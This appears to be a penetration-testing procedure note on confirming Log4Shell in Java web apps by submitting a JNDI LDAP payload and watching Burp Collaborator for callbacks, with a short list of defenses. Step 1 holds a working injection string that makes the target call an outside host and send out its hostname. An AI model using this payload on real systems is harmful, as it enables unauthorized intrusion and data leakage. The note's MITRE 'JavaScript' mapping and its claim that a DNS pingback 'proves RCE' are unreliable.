---
tags:
  - log4shell
  - callback
  - burp-collaborator
  - dns-resolution
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:50.086Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f2f13689-107f-4d01-9a11-b57d1dd6a08e
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Submit-Request-and-Monitor-Callback-with-Burp-Collaborator

## Summary

This procedure submits the crafted Log4Shell request and monitors Burp Collaborator for incoming callbacks, confirming successful JNDI LDAP interaction and remote code execution on the target server.

## Description

After injecting the payload, the request is sent to the vulnerable endpoint. The Log4j library processes the input, performing an LDAP lookup to the attacker's domain. Burp Collaborator captures DNS resolutions or connections from the target, verifying exploitation without direct code execution in this POC. This is used in web pentests against Java apps, revealing RCE risks in environments like DoD systems.

## Requirements

1. Crafted URL with Log4Shell payload ready
2. Burp Suite Professional with Collaborator module active
3. Unique Collaborator domain generated for the test
4. Ability to poll Collaborator for interactions

## Defense

Defensive measures and detection strategies:

- Implement network segmentation to block outbound LDAP/DNS to untrusted domains
- Log and alert on unexpected DNS queries from application servers
- Use endpoint detection tools to monitor for anomalous Java processes
- Regularly scan for Log4j vulnerabilities with tools like Log4j-Scanner

## Objectives

1. Trigger the JNDI lookup by submitting the request
2. Capture and analyze the callback for confirmation
3. Validate the exploitation impact

## Instructions

### Step 1: Submit the Request

**Context**: Send the payload-laden URL to invoke Log4j processing.

Navigate to or request the full URL: https://██████████/██████=${jndi:ldap://x${hostName}.log4j.xxxxxxx.burpcollaborator.net/a}.

> Use browser or HTTP client; the server logs the parameter, triggering the lookup.

### Step 2: Monitor Burp Collaborator

**Context**: Poll for incoming interactions to detect the callback.

In Burp Suite, open Collaborator and check for DNS or HTTP events from the target's IP.

> Look for resolutions including the target's hostname, confirming JNDI success.

### Step 3: Review Evidence

**Context**: Document the callback for reporting.

Capture screenshots or videos of Collaborator interactions showing the DNS pingback.

> This proves RCE, as the lookup could load malicious code from the LDAP server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Collaborator]]

## Tags

- [[log4shell]]
- [[callback]]
- [[tools/Burp-Collaborator]]
